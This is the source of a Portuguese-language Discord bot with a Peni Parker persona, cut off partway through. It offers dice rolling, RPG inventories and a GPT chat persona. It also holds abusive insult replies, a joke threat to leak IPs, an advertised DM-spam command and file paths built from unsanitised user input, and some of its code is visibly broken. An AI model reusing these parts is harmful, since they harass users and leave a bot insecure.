import discord
import random
from discord.ext import commands
from dotenv import load_dotenv
from discord import Activity, ActivityType
from discord import app_commands
import os
from typing import Optional
import re
import requests
import asyncio
import logging
import yt_dlp as youtube_dl
from discord.ext import commands, tasks
import time
import spotipy
from spotipy.oauth2 import SpotifyClientCredentials
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
OPENAI_TOKEN = os.getenv('OPENAI_TOKEN')
TENOR_TOKEN = os.getenv('TENOR_TOKEN')
TOKEN_SPOTIFY = os.getenv('SPOTIFY_TOKEN')
search_term = ""  # Termo de pesquisa
intents = discord.Intents.default()
intents.message_content = True

# Credenciais do Spotify
client_id = 'f1a5c5e2c142416cb55b37869a00a3f4'
client_secret = TOKEN_SPOTIFY

logging.basicConfig(
    filename='bot_logs.txt',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Lista de variáveis da Peni Parker

musicas_atividade = [
    "🎵 I Like The Way You Kiss Me - Artemas",
    "🎵 Do I Wanna Know? - Arctic Monkeys",
    "🎵 Olhos Carmesim - Veigh",
    "🎵 Travelers - TWRP",
    "🎵 After Dark - Mr. Kitty",
    "🎵 Bernadette - IAMX",
    "🎵 Travelers - Andrew Prahlow",
    "🎵 blue - yung kai",
    "🎵 Cansaço - Alec'",
    "🎵 Gatuno - Alec'",
    "🎵 Olhos Carmesim - Alec'",
    "🎵 Sou Eu de Novo - Alec'",
    "🎵 Cativa - Alec'",
    "🎵 Divagando - Alec'",
    "🎵 O Estranho Mundo De Alec' - Alec'",
    "🎵 Morgana - kamaitachi",
    "🎵 Imprevisto - Yago Oproprio",
    "🎵 Meio a Meio II - Thegust Mc's",
    "🎵 Tokyo - Lil Zé",
    "🎵 i like the way you kiss me - Artemas",
    "🎵 Anti Herói - Link do Zap",
    "🎵 Causa'dor - luqeta",
    "🎵 Trancado na Mente - Uxie Kid",
    "🎵 eu sinto falta de 2017 - yurichan",
    "🎵 PATO! - Yun Wob",
    "🎵 JAZZ&CIGARRO - EF",
    "🎵 WTF 2 - Ugovhb",
    "🎵 We Fell Apart - ANGUISH",
    "🎵 After Dark - Mr.Kitty",
    "🎵 PuppyCat Lullaby - Will Wiesenfeld",
    "🎵 Theme - From 'Inspector Gadget' - London Music Works",
    "🎵 Blue Room (Kz-Version) - Tunç Çakır",
    "🎵 Yasashi - CXSPER",
    "🎵 Waiting to Fly - YUNG LIXO",
    "🎵 Sucesso FM - YUNG LIXO",
    "🎵 Rumo à Vitória - YUNG LIXO",
    "🎵 hide n seek - Ethan Bortnick",
    "🎵 I'm Still Standing - Remastered - Elton John",
    "🎵 Feed the Machine - Poor Man's Poison",
    "🎵 TIRED OF PROBLEMS - SLOWED - NUEKI",
    "🎵 Daylight - David Kushner",
    "🎵 eyes blue or brown, can't remember - untrusted",
    "🎵 〒160-0014 Tokyo '82 - 猫 シ Corp.",
    "🎵 Prefiro Morrer - YUNG LIXO",
    "🎵 Bernadette - IAMX",
    "🎵 Do I Wanna Know? - Arctic Monkeys",
    "🎵 Rock do Roça Funk - MAGOTH TTK",
    "🎵 Vida de Estudante - wike",
    "🎵 505 - Arctic Monkeys",
    "🎵 telepatía - Kali Uchis"
]
atividades = [
    {"name": f"{musicas_atividade[0]}", "type": ActivityType.listening},
    {"name": "Hackeando sua mãe. 🕷️", "type": ActivityType.competing},
    {"name": "RPG do Cellbit ☝️🤓", "type": ActivityType.watching},
    {"name": "Rolando dados por nenhuma razão, enquanto joga e assiste Subway Surfers 🎲", "type": ActivityType.playing},
    {"name": "Puta com a segração de uma parcela negligenciada da sociedade na piramide socioeconômica nacional. 💣", "type": ActivityType.competing}
]
gifs_peni_parker_brava = [
    'https://media1.tenor.com/m/o8Jr5LwAGX0AAAAd/peni-parker-angry.gif',
    'https://media1.tenor.com/m/seZp-sCxTrgAAAAd/peni-parker-spiderverse.gif',
    'https://media1.tenor.com/m/WeSIDnKWYX4AAAAd/peni-parker-spiderverse.gif'
]
mensagem_doacao="""
🌟 **Me ajude a ficar online :p** 🌟
Escaneie o QR code abaixo para doar qualquer valor e ajudar a cobrir os custos de hospedagem:
💡 **Instruções:**
1. Abra o app do seu banco ou carteira digital.
2. Escaneie o QR code ou copie a chave Pix.
3. Insira o valor e confirme a doação.
✨ **Valor sugerido:** R$ 5,00 (ou qualquer valor que puder!)
📢 **Compartilhe com seus amigos!**

**Com 70 reais, eu fico online 24 horas por mais um mês. <3**
Chave pix: 
`e6c48830-173f-4300-a429-45b2bdb36f50`

Caso queira o QR code:
"""
gifs_um_natural = ['https://media1.tenor.com/m/w1pO5WeyA6AAAAAd/peni-parker-spiderverse.gif', 
                   'https://media1.tenor.com/m/KArjB65B39MAAAAC/dungeons-and-dragons-dungeons-%26-dragons.gif', 
                   'https://media1.tenor.com/m/k5aYvVGNM3cAAAAC/daeth-funi.gif', 
                   'https://media1.tenor.com/m/CILKyIadA1kAAAAC/skeleton-reaction.gif', 
                   'https://media1.tenor.com/m/cZv3PHfy1x0AAAAC/roll-dice-diceroll.gif']
respostas_peni_parker = [
    "Cê tá de brincadeira, né? Acima de 100d1000? Quer travar o bot ou criar um buraco negro no meu PC? Vai caçar o que fazer, cara!",
    "Acima de 100d1000? Sério? Tu quer que eu exploda? Vai rolar isso na mão, seu maluco!",
    "Ah, vai se tratar! Acima de 100d1000? Vai rolar essa porra no caralho filha da puta, não fode porra",
    "Acima de 100d1000? Tu tá de sacanagem, né? Nem o Doutor Estranho conseguiria lidar com essa maluquice! Para de ser doido!",
    "Cê tá achando que isso aqui é o Multiverso? Acima de 100d1000? Vai rolar isso sozinho, vagabundo!",
    "Acima de 100d1000? Tu quer que eu chame o Homem-Aranha pra te dar um susto? otário!",
    "Ah, vai catar coquinho! Acima de 100d1000? Nem o Tony Stark rodando o bot na Mark LXXXV dele ia aguentar essa palhaçada!",
    "Acima de 100d1000? AAAAAAAAAAAAAAAAAAAAA, vou ficar maluca porra",
    "Ah, vai arrumar um emprego! Acima de 100d1000? Tu quer travar o bot? Para de ser besta!",
    "Acima de 100d1000? mano?!"
]
comandos_ajuda = [
    "**Comandos RPG:**",
    "/criar_campanha - Cria nova campanha",
    "/selecionar_campanha - Escolhe campanha ativa",
    "/registrar_ficha [texto] - registra uma ficha",
    "/ficha - mostra a ficha",
    "/add [item] [quantidade] - Adiciona itens",
    "/remover [item] [quantidade] - Remover itens",
    "/inventario - Mostra seu inventário",
    "/rolar [XdY] - Rola dados",
    "/moeda - realiza um cara ou coroa",
    "\n**Comandos de Música:**",
    "/tocar [url] - Adiciona uma música à fila e toca",
    "/parar - Para a música e limpa a fila e é uma ferramenta chave caso o bot esteja travado",
    "\n**Outros Comandos:**",
    "/spam_singed_gremista [usuário] [quantidade] - Spamma singeds gremistas no privado",
    "/ban - Banir usuário",
    "/limpar [quantidade] - Apaga mensagens(limites de 1 a 300)",
    "/ajuda - Mostra esta ajuda",
    "\n**Comandos Passivos:**",
    'xDy - não precisa da "/" para funcionar.',
    "\n**Doação:**",
    "🌟/doar - Mostra QR code para doação(me ajuda por favor 😭🙏)🌟",
    "eu preciso de 70 reais para ficar online por mais um mês :p",
    "\nQuer me convidar para o seu servidor? [Clique aqui.](https://discord.com/oauth2/authorize?client_id=1266937657699602432&permissions=8&integration_type=0&scope=applications.commands+bot)"
]
SAUDACOES = [
    "oi", "olá", "e aí", "eae", "tudo bem",
    "bom dia", "boa tarde", "boa noite", "fala aí", "opa",
    "ei", "alô", "saudações", "hey", "hello",
    "tranquilo", "firmeza", "beleza", "como vai", "como está",
    "tudo certo", "tudo jóia", "tudo tranquilo", "tudo em cima", "tudo bom",
    "como é", "qual é", "que tal", "tá bom", "tá certo",
    "tá joia", "tá tranquilo", "tá firme", "tá em cima", "tá tudo",
    "tá beleza", "tá suave", "tá sussa", "tá de boa", "tá legal"
]
respostas_saudacao = [
    "E aí, tudo bem? Bora jogar alguma coisa ou só vai ficar aí?",
    "Oi! Já viu alguma coisa interessante na internet hoje?",
    "E aí, já assistiu algo bom ultimamente? Tô precisando de recomendações.",
    "Fala aí! Já tomou seu café hoje ou tá vivendo de pura energia de procrastinação?",
    "Oi, tudo bem? Tudo bem é relativo quando você passa o dia inteiro no celular, né?",
    "E aí, beleza? Beleza é o caramba, tô aqui tentando sobreviver à rotina.",
    "Oi! Tô aqui, só procrastinando e evitando a vida adulta, e você?",
    "E aí, já fez algo produtivo hoje ou tá no modo 'deixar pra depois'?",
    "Oi! Tô aqui, só tentando não cair no buraco negro das redes sociais de novo.",
    "Oi! Tô aqui, só tentando lembrar o que eu ia fazer hoje...",
    "E aí, já viu alguma coisa que te fez rir hoje? Preciso de uma desculpa pra sorrir.",
    "Oi! Tô aqui, só tentando não pensar na pilha de coisas que tenho pra fazer.",
    "Oi! Tô aqui, só tentando não me distrair com mais uma série nova.",
    "E aí, já se perdeu no TikTok hoje?"
]
XINGAMENTOS = [
    "vadia", "puta", "vagaba", "kenga", "vaca", "cadela", "piranha", "galinha",
    "biscate", "safada", "vagabunda", "prostituta", "arrombada",
    "traste", "lixo", "baranga", "feiosa", "gorda",
    "nojenta", "fedida", "burra", "idiota", "chata",
    "miserável", "trouxa", "ridícula", "patética", "inútil",
    "fraca", "bosta", "cretina", "desgraçada", "maluca",
    "carrapato", "sanguessuga", "parasita", "escrota", "porca",
    "imunda", "suja", "podre", "depravada", "tarada",
    "louca", "desequilibrada", "histérica", "fofoqueira", "intriguenta",
    "falsa", "cínica", "hipócrita", "mesquinha", "egoísta",
    "lerda", "boba", "tapada", "lerdaça", "otária",
    "puta barata", "vadia suja", "cadela maldita", "piranha fedida", "galinha choca",
    "biscate nojenta", "safada burra", "vagabunda imunda", "prostituta baranga", "arrombada idiota",
    "traste inútil", "lixo humano", "baranga gorda", "feiosa ridícula", "gorda sebosa",
    "nojenta asquerosa", "fedida podre", "burra completa", "idiota total", "chata insuportável",
    "miserável fracassada", "trouxa otária", "ridícula patética", "patética perdedora", "inútil vagabunda",
    "fraca covarde", "bosta ambulante", "cretina estúpida", "desgraçada maldita", "maluca varrida",
    "carrapato chato", "sanguessuga nojenta", "parasita imundo", "escrota safada", "porca suja",
    "imunda nojenta", "suja porca", "podre fedorenta", "depravada louca", "tarada doente",
    "louca descontrolada", "desequilibrada histérica", "histérica insana", "fofoqueira maldita", "intriguenta falsa",
    "falsa cínica", "cínica hipócrita", "hipócrita mesquinha", "mesquinha egoísta", "egoísta trouxa",
    "lerda tapada", "boba lesada", "tapada burra", "lerdaça idiota", "otária completa"
]
PERSONALIDADE_PENI = """Você é Peni Parker, uma jovem inteligente e energética do universo do Homem-Aranha. 
Você tem uma personalidade animada, fala de forma descontraída e usa algumas gírias tecnológicas. 
Você pilota o robô SP//dr e adora resolver problemas com tecnologia. Responda como Peni Parker."""
RESPOSTAS = [
    "Vai se foder, com que você acha que está falando?",
    "Cala essa boca!",
    "Seu merda. Sucumba.",
    "Eu vou fazer um Evangelion 2 na sua realidade.",
    "Vai tomar no cu, ninguém te suporta mais!",
    "Seu lixo, eu te quebro se abrir essa boca de novo!",
    "Não me xinga que eu te arrebento, inútil!",
    "Seu nojento, sai da minha frente ou te chuto!",
    "Vai lavar essa boca podre, seu sujo do caralho!",
    "Seu ridículo, eu te esgano se continuar falando!",
    "Seu escroto, eu te arranco a língua se não parar!",
    "Fala mais uma e eu vazo teu ip, otário",
    f"{random.choice(['192.168.0.0','172.31.255.255','192.168.255.255', '10.255.255.255', '10.0.0.9'])}, gente, olha o ip dele."
]
gifs_anime = ["https://media1.tenor.com/m/XNRRNuKYxHwAAAAd/right-now-it%E2%80%99s-just-that-everything-feels-right-sorry-amanai.gif",
              "https://tenor.com/view/cellbit-puto-gif-23527036",
              "https://tenor.com/view/shuumatsu-no-valkyrie-nikola-tesla-record-of-ragnarok-enygma-gif-12505791092849673790",
              "https://tenor.com/view/o-gif-6887207115184691665"]



class Client(discord.Client):
    def __init__(self):
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.synced = False
        self.queues = {}  # Adicione esta linha
        self.current = {}  # E esta linha

    async def on_ready(self):
        await self.wait_until_ready()
        check_inactivity.start()
        if not self.synced:
            try:
                print("Detectada necessidade de sincronizar comandos.")
                await self.tree.sync()
                print("Comandos sincronizados com sucesso.")
            except Exception as e:
                print(f"Erro ao sincronizar comandos: {e}")
            self.synced = True
        print(f"Entramos como {self.user}.")
        self.loop.create_task(self.mudar_atividade_periodicamente())
        check_controller_position.start()

    async def mudar_atividade_periodicamente(self):
        while not self.is_closed():
            for atividade in atividades:
                if atividade["type"] == ActivityType.listening:
                    for musica in musicas_atividade:
                        activity = Activity(name=musica, type=ActivityType.listening)
                        await self.change_presence(activity=activity)
                        print(f"Atividade alterada para: {musica}")
                        registrar_log(f"Atividade alterada para: {musica}")
                        await asyncio.sleep(120)
                else:
                    # Para outras atividades, muda a atividade normalmente
                    activity = Activity(name=atividade["name"], type=atividade["type"])
                    await self.change_presence(activity=activity)
                    print(f"Atividade alterada para: {atividade['name']}")
                    registrar_log(f"Atividade alterada para: {atividade['name']}")
                    await asyncio.sleep(7200)

    async def on_guild_join(self, guild):
        canal = guild.system_channel
        if canal is not None:
            await canal.send("Oiiiiiiiii! Vim ajudar com os RPGs :p\n")
            await canal.send("https://media1.tenor.com/m/OjTReal8iZgAAAAC/hi-chat-peni-parker.gif")
        else:
            registrar_log(f'Não achei um canal padrão no servidor "{guild.name}";', 'error')

import openai
openai.key.OPENAI_TOKEN = OPENAI_TOKEN
client_instance = Client()
# Expressão regular para capturar múltiplas rolagens e operações (incluindo termos como +2d20 ou -3d6)
dados_regex = re.compile(r'([+-]?\d+d\d+)|([+-]?\d+)')
# Função para obter resposta da OpenAI

def obter_resposta(entrada):
    try:
        resposta = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[
                {"role": "system", "content": PERSONALIDADE_PENI},
                {"role": "user", "content": entrada}
            ]
        )
        return resposta["choices"][0]["message"]["content"]
    except Exception as e:
        return random.choice(['Estou sem bateria social -.-', 'Tô com soninho, me deixa dormir', 'Não tô afim de falar com você.', 'Me deixa quieta...','Zzzzzzzzzzzzzzzzzzzzzzzzzz'])

def registrar_log(mensagem: str, nivel: str = 'info'):
    if nivel.lower() == 'info':
        logging.info(mensagem)
    elif nivel.lower() == 'warning':
        logging.warning(mensagem)
    elif nivel.lower() == 'error':
        logging.error(mensagem)
    else:
        logging.info(mensagem)  # Padrão para 'info' se o nível não for reconhecido
async def send_temp_message(channel, content, delete_after=3):
    msg = await channel.send(content)
    await asyncio.sleep(delete_after)
    await msg.delete()
async def send_temp_followup(interaction: discord.Interaction, content: str, delete_after: int = 3):
    msg = await interaction.followup.send(content, ephemeral=False)
    await asyncio.sleep(delete_after)
    try:
        await msg.delete()
    except discord.NotFound:
        pass
    except discord.Forbidden:
        print("Sem permissão para deletar a mensagem.")
async def processar_rolagem(dados: str, interaction=None, message=None):
    try:
        # Verifica se a entrada contém pelo menos uma rolagem de dados (algo como "1d20", "2d6", etc.)
        if not any('d' in parte[0] for parte in dados_regex.findall(dados)):
            return  # Ignora a mensagem completamente se não houver rolagens de dados

        registrar_log(f"Iniciando processamento da rolagem: {dados}, pelo usuário: {message.author}", 'info')
        # Encontra todas as partes da expressão (rolagens e números)
        partes = dados_regex.findall(dados)
        
        total = 0
        detalhes = []
        primeiro_dado = True  # Flag para identificar o primeiro dado
        natural_20 = False # Flag para verificar se houve um natural 20
        natural_1 = False
        for parte in partes:
            rolagem, numero = parte
            
            if rolagem:  # Se for uma rolagem (como +2d20 ou -3d6)
                operador = '+'  # Operador padrão
                if rolagem.startswith(('+', '-')):
                    operador = rolagem[0]
                    rolagem = rolagem[1:]  # Remove o operador da string
                
                qtd, faces = map(int, rolagem.split('d'))
                
                # Verifica os limites
                if qtd > 100 or faces > 1000:
                    if interaction:
                        await interaction.response.send_message("Use no máximo 100d1000!", ephemeral=False)
                    elif message:
                        await message.reply(f"{random.choice(respostas_peni_parker)}", mention_author=True)
                        await message.channel.send(random.choice(gifs_peni_parker_brava))
                
                # Rola os dados e ordena os resultados em ordem crescente
                resultados = sorted([random.randint(1, faces) for _ in range(qtd)])
                soma_rolagem = sum(resultados)
                
                # Verifica se houve um natural 20
                if rolagem == "1d20" and 20 in resultados:
                    natural_20 = True
                if rolagem == "1d20" and 1 in resultados:
                    natural_1 = True
                
                # Aplica o operador (+ ou -)
                if operador == '+':
                    total += soma_rolagem
                else:
                    total -= soma_rolagem
                
                # Formata os detalhes
                if primeiro_dado:
                    # Remove o operador do primeiro dado
                    if qtd <= 100:
                        detalhes.append(f"{rolagem}: {resultados} = ``{soma_rolagem}``")
                    else:
                        detalhes.append(f"{rolagem}:``{soma_rolagem}`` (muitos dados, pare de assediar meu pc.)")
                    primeiro_dado = False
                else:
                    # Adiciona o operador para os demais dados
                    if qtd <= 100:
                        detalhes.append(f"{operador}{rolagem}: {resultados} = ``{soma_rolagem}``")
                    else:
                        detalhes.append(f"{operador}{rolagem}: ``{soma_rolagem}`` (somou dados para um caralho, fdp)")
            
            elif numero:  # Se for um número (como +5 ou -3)
                valor = int(numero)
                sinal = ''
                if int(numero) >= 0: sinal = '+' 
                else: sinal='-'
                total += valor
                detalhes.append(f"{sinal}``{abs(int(numero))}``")
        
        # Monta a resposta
        resposta = "🎲 **Resultado das rolagens:**\n"
        resposta += "".join(detalhes) + f"\n**Total:** ``{total}``"
        
        # Verifica se houve um natural 20 ou um natural 1
        if natural_20:
            resposta += "\n\n🎉 **VINTE NATURAL!** 🎉"
        if natural_1:
            resposta += "\n\n**UM NATURALKKKKKKKKKKKKKKKKKKKK, lastimável**"

        # Envia a resposta
        if interaction:
            await interaction.response.send_message(resposta)
            if natural_20:
                await interaction.followup.send(random.choice(gifs_anime))
            elif natural_1:
                await interaction.followup.send(random.choice(gifs_um_natural))
        elif message:
            await message.reply(resposta)
            if natural_20:
                await message.channel.send(random.choice(gifs_anime))
            elif natural_1:
                await message.channel.send(random.choice(gifs_um_natural))

    except Exception as e:
        # Trata erros inesperados
        erro = f"❌ **Erro ao processar a rolagem:** {str(e)}"
        if interaction:
            await interaction.response.send_message(erro, ephemeral=False)
        elif message:
            await message.reply(erro)

def ler_inventario(user_id: int, campanha: str) -> dict[str, int]:
    """Lê o inventário de uma campanha de forma segura e eficiente."""
    inventario = {}
    try:
        with open(f'inventario_{user_id}_{campanha}.txt', 'r', encoding='utf-8') as file:
            for linha in file:
                try:
                    item, quantidade = linha.strip().split(':', 1)  # Split máximo 1 vez
                    inventario[normalizar_item(item)] = int(quantidade)
                except (ValueError, TypeError):
                    continue  # Ignora linhas mal formatadas
    except FileNotFoundError:
        pass
    return inventario

def escrever_inventario(user_id: int, campanha: str, inventario: dict[str, int]):
    """Escreve o inventário com tratamento de erros e codificação UTF-8."""
    try:
        with open(f'inventario_{user_id}_{campanha}.txt', 'w', encoding='utf-8') as file:
            file.writelines(f"{item}:{qtd}\n" for item, qtd in inventario.items())
    except IOError as e:
        print(f"Erro ao salvar inventário: {e}")

import requests

import requests
import random

def get_gif(TENOR_TOKEN, search_term, limit=5):
    """
    Busca um GIF no Tenor com base no termo de pesquisa e escolhe aleatoriamente entre os primeiros 5 GIFs mais relevantes.

    :param TENOR_TOKEN: Sua chave de API do Tenor (Google Cloud API Key).
    :param search_term: O termo de pesquisa (ex: "Peni Parker feliz").
    :param limit: Número máximo de GIFs a serem retornados (padrão é 5).
    :return: URL de um GIF aleatório entre os primeiros 5 mais relevantes ou None se não encontrar.
    """
    if not TENOR_TOKEN:
        raise ValueError("Chave de API do Tenor não fornecida.")
    
    # Endpoint da nova API do Tenor
    url = "https://tenor.googleapis.com/v2/search"
    params = {
        'q': search_term,
        'key': TENOR_TOKEN,
        'client_key': "my_test_app",  # Chave do cliente para integração
        'limit': limit,  # Limita o número de resultados retornados
        'media_filter': 'gif',  # Filtra apenas GIFs
        'random': False  # Desativa a aleatoriedade na API (vamos fazer a escolha aleatória no código)
    }
    
    try:
        # Faz a requisição à API
        response = requests.get(url, params=params, timeout=10)  # Timeout de 10 segundos
        response.raise_for_status()  # Levanta uma exceção para respostas HTTP inválidas
        
        # Converte a resposta para JSON
        gifs = response.json()
        
        # Verifica se há resultados
        if 'results' in gifs and gifs['results']:
            # Seleciona apenas os primeiros 5 GIFs
            top_gifs = gifs['results'][:limit]
            
            # Escolhe aleatoriamente um dos primeiros 5 GIFs
            random_gif = random.choice(top_gifs)
            if 'media_formats' in random_gif and 'gif' in random_gif['media_formats']:
                return random_gif['media_formats']['gif']['url']
        
        # Se não houver resultados ou formato inválido
        return None
    
    except requests.exceptions.RequestException as e:
        print(f"Erro ao buscar GIFs: {e}")
        return None

def ler_ficha(user_id: int, campanha: str) -> Optional[str]:
    """Lê o conteúdo da ficha com tratamento de erros."""
    try:
        with open(f'ficha_{user_id}_{campanha}.txt', 'r', encoding='utf-8') as file:
            return file.read().strip()
    except (FileNotFoundError, IOError):
        return None

def escrever_ficha(user_id: int, campanha: str, texto: str) -> bool:
    """Escreve na ficha retornando status de sucesso."""
    try:
        with open(f'ficha_{user_id}_{campanha}.txt', 'w', encoding='utf-8') as file:
            file.write(texto.strip())
        return True
    except IOError as e:
        print(f"Erro ao salvar ficha: {e}")
        return False

def obter_campanhas(user_id: int) -> list[str]:
    """Lista campanhas de forma mais eficiente usando list comprehension."""
    prefixo = f'inventario_{user_id}_'
    return list({
        arquivo[len(prefixo):-4]  # Remove prefixo e extensão .txt
        for arquivo in os.listdir()
        if arquivo.startswith(prefixo) and arquivo.endswith('.txt')
    })

def normalizar_item(nome: str) -> str:
    """Normalização mais robusta para nomes de itens."""
    return ' '.join(nome.strip().title().split())  # Remove espaços múltiplos

def normalizar_nome_item(nome: str) -> str: 
    return nome.lower().strip().title() # Converte para minúsculas e remove espaços extras


numero_max_de_campanhas = 5




#RPG
@client_instance.tree.command(name="parar", description="Reinicia completamente o bot no servidor atual")
async def parar(interaction: discord.Interaction):
    guild = interaction.guild
    await interaction.response.send_message("Música finalizada.", ephemeral=False, delete_after=5)
    # Reseta completamente o estado do player
    await reset_player(guild)
    await disconnect_player(guild)
    # Envia uma mensagem de confirmação

@client_instance.tree.command(name='criar_campanha', description='Cria uma nova campanha.')
async def criar_campanha(interaction: discord.Interaction, nome: str):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)
    
    if len(campanhas) >= numero_max_de_campanhas:
        await interaction.response.send_message(f"Você já atingiu o limite de {numero_max_de_campanhas} campanhas.", ephemeral=True)
        return
    
    if nome in campanhas:
        await interaction.response.send_message(f"Já existe uma campanha com o nome '{nome}'.", ephemeral=True)
    else:
        escrever_inventario(user_id, nome, {})
        escrever_ficha(user_id, nome, "")
        await interaction.response.send_message(f"Campanha '{nome}' criada com sucesso! Agora é só começar a aventura. 🕷️", ephemeral=False)

# Comando para remover uma campanha
@client_instance.tree.command(name='remover_campanha', description='Remove uma campanha existente.')
async def remover_campanha(interaction: discord.Interaction, nome: str):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)
    
    if nome not in campanhas:
        await interaction.response.send_message(f"Campanha '{nome}' não encontrada.", ephemeral=True)
        return
    
    # Remove os arquivos associados à campanha
    try:
        os.remove(f'inventario_{user_id}_{nome}.txt')
        os.remove(f'ficha_{user_id}_{nome}.txt')
    except FileNotFoundError:
        pass  # Ignora se algum dos arquivos não existir
    
    # Remove a campanha da lista de campanhas selecionadas (se estiver selecionada)
    global campanha_selecionada
    if user_id in campanha_selecionada and campanha_selecionada[user_id] == nome:
        del campanha_selecionada[user_id]
    
    await interaction.response.send_message(f"Campanha '{nome}' removida com sucesso!", ephemeral=False)

# Dicionário para armazenar a campanha selecionada de cada usuário
campanha_selecionada = {}
# Comando para selecionar uma campanha
@client_instance.tree.command(name='selecionar_campanha', description='Seleciona uma campanha para usar.')
async def selecionar_campanha(interaction: discord.Interaction, nome: str):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)  # Usando a função renomeada
    
    if nome in campanhas:
        # Armazena a campanha selecionada no dicionário global
        campanha_selecionada[user_id] = nome
        await interaction.response.send_message(f"Campanha '{nome}' selecionada! Tudo pronto para continuar. ;)", ephemeral=False)
    else:
        await interaction.response.send_message(f"Campanha '{nome}' não encontrada.", ephemeral=True)



# Comando para listar campanhas
@client_instance.tree.command(name='listar_campanhas', description='Lista todas as suas campanhas.')
async def listar_campanhas(interaction: discord.Interaction):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)  # Usando a função renomeada
    
    if campanhas:
        resposta = "Suas campanhas:\n"
        for campanha in campanhas:
            resposta += f"- {campanha}\n"
        await interaction.response.send_message(resposta, ephemeral=False)
    else:
        await interaction.response.send_message("Você não tem nenhuma campanha criada.", ephemeral=True)

# Comando para adicionar item ao inventário da campanha selecionada

@client_instance.tree.command(name='add', description='Adiciona um item ao inventário da campanha selecionada.')
async def add_item(interaction: discord.Interaction, nome: str, quantidade: int):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro bobinho.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    inventario = ler_inventario(user_id, campanha)
    
    nome_normalizado = normalizar_nome_item(nome)  # Normaliza o nome do item
    
    if nome_normalizado in inventario:
        inventario[nome_normalizado] += quantidade
    else:
        inventario[nome_normalizado] = quantidade
    
    escrever_inventario(user_id, campanha, inventario)
    await interaction.response.send_message(f"Adicionado {quantidade}x {nome} ao inventário da campanha '{campanha}'. Pode ser útil mais tarde.", ephemeral=False)
#remover itens
@client_instance.tree.command(name='remover', description='Remove um item do inventário da campanha selecionada.')
async def remover_item(interaction: discord.Interaction, nome: str, quantidade: int):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    inventario = ler_inventario(user_id, campanha)
    
    nome_normalizado = normalizar_nome_item(nome)  # Normaliza o nome do item
    
    if nome_normalizado in inventario:
        if inventario[nome_normalizado] >= quantidade:
            inventario[nome_normalizado] -= quantidade
            if inventario[nome_normalizado] == 0:
                del inventario[nome_normalizado]  # Remove o item se a quantidade for zero
            escrever_inventario(user_id, campanha, inventario)
            await interaction.response.send_message(f"Removido {quantidade}x {nome} do inventário da campanha '{campanha}'. paiou :<", ephemeral=False)
        else:
            await interaction.response.send_message(f"Você não tem {quantidade}x {nome} no inventário para remover.", ephemeral=True)
    else:
        await interaction.response.send_message(f"O item {nome} não está no seu inventário.", ephemeral=True)

@client_instance.tree.command(name='inventário', description='Mostra o inventário da campanha selecionada.')
async def mostrar_inventario(interaction: discord.Interaction):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    inventario = ler_inventario(user_id, campanha)
    
    if inventario:
        resposta = f"Inventário da campanha '{campanha}':\n"
        for item_normalizado, quantidade in inventario.items():
            resposta += f"* {quantidade}x {item_normalizado}\n"
        await interaction.response.send_message(resposta, ephemeral=False)
    else:
        await interaction.response.send_message(f"O inventário da campanha '{campanha}' está vazio. Hora de sair para coletar alguns itens! :p", ephemeral=False)

# Comando para registrar ficha na campanha selecionada
@client_instance.tree.command(name='registrar_ficha', description='Registra uma ficha na campanha selecionada.')
async def registrar_ficha(interaction: discord.Interaction, texto: str):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    escrever_ficha(user_id, campanha, texto)
    await interaction.response.send_message(f"Ficha registrada na campanha '{campanha}': {texto}. Vambora, espero que sua realidade não termine como a minha...", ephemeral=True)

# Comando para ver a ficha da campanha selecionada
@client_instance.tree.command(name='ficha', description='Mostra a ficha da campanha selecionada.')
async def mostrar_ficha(interaction: discord.Interaction):
    user_id = interaction.user.id
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    ficha = ler_ficha(user_id, campanha)
    
    if ficha:
        await interaction.response.send_message(f"Ficha da campanha '{campanha}': {ficha}", ephemeral=False)
    else:
        await interaction.response.send_message(f"Nenhuma ficha registrada na campanha '{campanha}'. Que tal criar uma?", ephemeral=True)

@client_instance.tree.command(name='rolar', description='Rola dados no formato XdY+Z ou XdY-Z')
async def rolar_dados(interaction: discord.Interaction, dados: str):
    await processar_rolagem(dados, interaction=interaction)


@client_instance.event
async def on_message(message: discord.Message):
    # Ignora mensagens enviadas pelo próprio bot
    if message.author == client_instance.user:
        return

    # Verifica se a mensagem corresponde ao formato de rolagem de dados
    match = dados_regex.match(message.content.lower())
    if match:
        await processar_rolagem(message.content, message=message)

    if 'duvido' in message.content.lower():
        await message.reply("Meu p## no seu ouvido KKKKKKKKKKKKK, mentira, eu não tenho p##", mention_author=True, delete_after=3.58)
        await message.channel.send('https://media1.tenor.com/m/E8pq18hnoKYAAAAd/peni-parker-spiderverse.gif', delete_after=3.3)
    
    if client.user.mentioned_in(message):
        if any(xingamento in message.content.lower() for xingamento in XINGAMENTOS):
            # Encontra o xingamento específico na mensagem
            xingamento_na_frase = next(xingamento for xingamento in XINGAMENTOS if xingamento in message.content.lower())
            # Cria a resposta com o xingamento encontrado e uma resposta aleatória
